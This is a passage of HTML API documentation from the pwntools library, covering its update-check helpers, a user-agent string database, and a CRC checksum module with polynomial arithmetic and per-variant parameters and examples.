<dd><p>Return True if an update is available on PyPI.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">available_on_pypi</span><span class="p">()</span> 
<span class="go">&lt;Version(&#39;...&#39;)&gt;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">available_on_pypi</span><span class="p">(</span><span class="n">prerelease</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">is_prerelease</span>
<span class="go">False</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.update.cache_file">
<code class="descclassname">pwnlib.update.</code><code class="descname">cache_file</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/update.py#L56-71"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.update.cache_file" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns the path of the file used to cache update data, and ensures that it exists.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.update.last_check">
<code class="descclassname">pwnlib.update.</code><code class="descname">last_check</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/update.py#L73-80"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.update.last_check" title="Permalink to this definition">¶</a></dt>
<dd><p>Return the date of the last check</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.update.perform_check">
<code class="descclassname">pwnlib.update.</code><code class="descname">perform_check</code><span class="sig-paren">(</span><em>prerelease=False</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/update.py#L94-156"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.update.perform_check" title="Permalink to this definition">¶</a></dt>
<dd><p>Perform the update check, and report to the user.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>prerelease</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether or not to include pre-release versions.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">A list of arguments to the update command.</td>
</tr>
</tbody>
</table>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">packaging.version</span> <span class="k">import</span> <span class="n">Version</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pwnlib</span><span class="o">.</span><span class="n">update</span><span class="o">.</span><span class="n">current_version</span> <span class="o">=</span> <span class="n">Version</span><span class="p">(</span><span class="s2">&quot;999.0.0&quot;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">perform_check</span><span class="p">()</span>
<span class="go">None</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pwnlib</span><span class="o">.</span><span class="n">update</span><span class="o">.</span><span class="n">current_version</span> <span class="o">=</span> <span class="n">Version</span><span class="p">(</span><span class="s2">&quot;0.0.0&quot;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">perform_check</span><span class="p">()</span> 
<span class="go">[&#39;pip&#39;, &#39;install&#39;, &#39;-U&#39;, ...]</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">bail</span><span class="p">(</span><span class="o">*</span><span class="n">a</span><span class="p">):</span> <span class="k">raise</span> <span class="ne">Exception</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pypi</span>   <span class="o">=</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">update</span><span class="o">.</span><span class="n">available_on_pypi</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">perform_check</span><span class="p">(</span><span class="n">prerelease</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="go">[&#39;pip&#39;, &#39;install&#39;, &#39;-U&#39;, &#39;pwntools&#39;]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">perform_check</span><span class="p">(</span><span class="n">prerelease</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>  
<span class="go">[&#39;pip&#39;, &#39;install&#39;, &#39;-U&#39;, &#39;pwntools...&#39;]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.update.should_check">
<code class="descclassname">pwnlib.update.</code><code class="descname">should_check</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/update.py#L82-92"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.update.should_check" title="Permalink to this definition">¶</a></dt>
<dd><p>Return True if we should check for an update</p>
</dd></dl>

</div>
<span id="document-useragents"></span><div class="section" id="module-pwnlib.useragents">
<span id="pwnlib-useragents-a-database-of-useragent-strings"></span><h3><a class="reference internal" href="#module-pwnlib.useragents" title="pwnlib.useragents"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.useragents</span></code></a> &#8212; A database of useragent strings<a class="headerlink" href="#module-pwnlib.useragents" title="Permalink to this headline">¶</a></h3>
<p>Database of &gt;22,000 user agent strings</p>
<dl class="function">
<dt id="pwnlib.useragents.getall">
<code class="descclassname">pwnlib.useragents.</code><code class="descname">getall</code><span class="sig-paren">(</span><span class="sig-paren">)</span> &#x2192; str set<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/useragents.py#L23-40"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.useragents.getall" title="Permalink to this definition">¶</a></dt>
<dd><p>Get all the user agents that we know about.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>None</strong> &#8211; </td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">A set of user agent strings.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;libcurl-agent/1.0&#39;</span> <span class="ow">in</span> <span class="n">getall</span><span class="p">()</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;wget&#39;</span> <span class="ow">in</span> <span class="n">getall</span><span class="p">()</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.useragents.random">
<code class="descclassname">pwnlib.useragents.</code><code class="descname">random</code><span class="sig-paren">(</span><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/useragents.py#L42-58"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.useragents.random" title="Permalink to this definition">¶</a></dt>
<dd><p>Get a random user agent string.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>None</strong> &#8211; </td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">A random user agent string selected from <a class="reference internal" href="#pwnlib.useragents.getall" title="pwnlib.useragents.getall"><code class="xref py py-func docutils literal"><span class="pre">getall()</span></code></a>.</td>
</tr>
</tbody>
</table>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">random</span> <span class="k">as</span> <span class="nn">randommod</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">randommod</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">random</span><span class="p">()</span>
<span class="go">&#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FunWebProducts; FunWebProducts-MyTotalSearch; iebar)&#39;</span>
</pre></div>
</div>
</dd></dl>

</div>
<span id="document-util/crc"></span><div class="section" id="module-pwnlib.util.crc">
<span id="pwnlib-util-crc-calculating-crc-sums"></span><h3><a class="reference internal" href="#module-pwnlib.util.crc" title="pwnlib.util.crc"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.crc</span></code></a> &#8212; Calculating CRC-sums<a class="headerlink" href="#module-pwnlib.util.crc" title="Permalink to this headline">¶</a></h3>
<p>Module for calculating CRC-sums.</p>
<p>Contains all crc implementations know on the interwebz. For most implementations
it contains only the core crc algorithm and not e.g. padding schemes.</p>
<p>It is horribly slow, as implements a naive algorithm working direclty on
bit polynomials. This class is exposed as <cite>BitPolynom</cite>.</p>
<p>The current algorithm is super-linear and takes about 4 seconds to calculate
the crc32-sum of <code class="docutils literal"><span class="pre">'A'*40000</span></code>.</p>
<p>An obvious optimization would be to actually generate some lookup-tables.</p>
<dl class="class">
<dt id="pwnlib.util.crc.BitPolynom">
<em class="property">class </em><code class="descclassname">pwnlib.util.crc.</code><code class="descname">BitPolynom</code><span class="sig-paren">(</span><em>n</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.BitPolynom" title="Permalink to this definition">¶</a></dt>
<dd><p>Class for representing GF(2)[X], i.e. the field of polynomials over
GF(2).</p>
<p>In practice the polynomials are represented as numbers such that <cite>x**n</cite>
corresponds to <cite>1 &lt;&lt; n</cite>. In this representation calculations are easy: Just
do everything as normal, but forget about everything the carries.</p>
<p>Addition becomes xor and multiplication becomes carry-less multiplication.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p1</span> <span class="o">=</span> <span class="n">BitPolynom</span><span class="p">(</span><span class="s2">&quot;x**3 + x + 1&quot;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p1</span>
<span class="go">BitPolynom(&#39;x**3 + x + 1&#39;)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">int</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span>
<span class="go">11</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p1</span> <span class="o">==</span> <span class="n">BitPolynom</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p2</span> <span class="o">=</span> <span class="n">BitPolynom</span><span class="p">(</span><span class="s2">&quot;x**2 + x + 1&quot;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p1</span> <span class="o">+</span> <span class="n">p2</span>
<span class="go">BitPolynom(&#39;x**3 + x**2&#39;)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p1</span> <span class="o">*</span> <span class="n">p2</span>
<span class="go">BitPolynom(&#39;x**5 + x**4 + 1&#39;)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p1</span> <span class="o">/</span> <span class="n">p2</span>
<span class="go">BitPolynom(&#39;x + 1&#39;)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p1</span> <span class="o">%</span> <span class="n">p2</span>
<span class="go">BitPolynom(&#39;x&#39;)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">d</span><span class="p">,</span> <span class="n">r</span> <span class="o">=</span> <span class="nb">divmod</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">d</span> <span class="o">*</span> <span class="n">p2</span> <span class="o">+</span> <span class="n">r</span> <span class="o">==</span> <span class="n">p1</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">BitPolynom</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
    <span class="o">...</span>
<span class="gr">ValueError</span>: <span class="n">Polynomials cannot be negative: -1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">BitPolynom</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
    <span class="o">...</span>
<span class="gr">ValueError</span>: <span class="n">Not a valid polynomial: y</span>
</pre></div>
</div>
<dl class="method">
<dt id="pwnlib.util.crc.BitPolynom.degree">
<code class="descname">degree</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L191-209"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.BitPolynom.degree" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns the degree of the polynomial.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">BitPolynom</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">degree</span><span class="p">()</span>
<span class="go">0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">BitPolynom</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">degree</span><span class="p">()</span>
<span class="go">0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">BitPolynom</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">degree</span><span class="p">()</span>
<span class="go">1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">BitPolynom</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span><span class="o">.</span><span class="n">degree</span><span class="p">()</span>
<span class="go">2</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">BitPolynom</span><span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">degree</span><span class="p">()</span>
<span class="go">9</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">BitPolynom</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">degree</span><span class="p">()</span>
<span class="go">10</span>
</pre></div>
</div>
</dd></dl>

</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.generic_crc">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">generic_crc</code><span class="sig-paren">(</span><em>data</em>, <em>polynom</em>, <em>width</em>, <em>init</em>, <em>refin</em>, <em>refout</em>, <em>xorout</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L254-297"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.generic_crc" title="Permalink to this definition">¶</a></dt>
<dd><p>A generic CRC-sum function.</p>
<p>This is suitable to use with:
<a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm">http://reveng.sourceforge.net/crc-catalogue/all.htm</a></p>
<p>The &#8220;check&#8221; value in the document is the CRC-sum of the string &#8220;123456789&#8221;.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to calculate the CRC-sum of. This should either be a string or a list of bits.</li>
<li><strong>polynom</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The polynomial to use.</li>
<li><strong>init</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; If the CRC-sum was calculated in hardware, then this would b
the initial value of the checksum register.</li>
<li><strong>refin</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Should the input bytes be reflected?</li>
<li><strong>refout</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Should the checksum be reflected?</li>
<li><strong>xorout</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The value to xor the checksum with before outputting</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.cksum">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">cksum</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L331-347"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.cksum" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the same checksum as returned by the UNIX-tool <code class="docutils literal"><span class="pre">cksum</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">cksum</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">930766865</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.find_crc_function">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">find_crc_function</code><span class="sig-paren">(</span><em>data</em>, <em>checksum</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L349-366"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.find_crc_function" title="Permalink to this definition">¶</a></dt>
<dd><p>Finds all known CRC functions that hashes a piece of data into a specific
checksum. It does this by trying all known CRC functions one after the other.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Data for which the checksum is known.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">find_crc_function</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">,</span> <span class="mi">46197</span><span class="p">)</span>
<span class="go">[&lt;function crc_crc_16_dnp at ...&gt;]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.arc">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">arc</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.arc" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the arc checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x8005</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.16">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.16</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">arc</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">47933</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_10">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_10</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_10" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_10 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x233</li>
<li>width   = 10</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.10">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.10</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_10</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">409</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_10_cdma2000">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_10_cdma2000</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_10_cdma2000" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_10_cdma2000 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x3d9</li>
<li>width   = 10</li>
<li>init    = 0x3ff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-10-cdma2000">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-10-cdma2000</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_10_cdma2000</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">563</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_10_gsm">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_10_gsm</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_10_gsm" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_10_gsm checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x175</li>
<li>width   = 10</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x3ff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-10-gsm">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-10-gsm</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_10_gsm</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">298</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_11">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_11</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_11" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_11 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x385</li>
<li>width   = 11</li>
<li>init    = 0x1a</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.11">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.11</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_11</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">1443</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_11_umts">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_11_umts</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_11_umts" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_11_umts checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x307</li>
<li>width   = 11</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-11-umts">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-11-umts</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
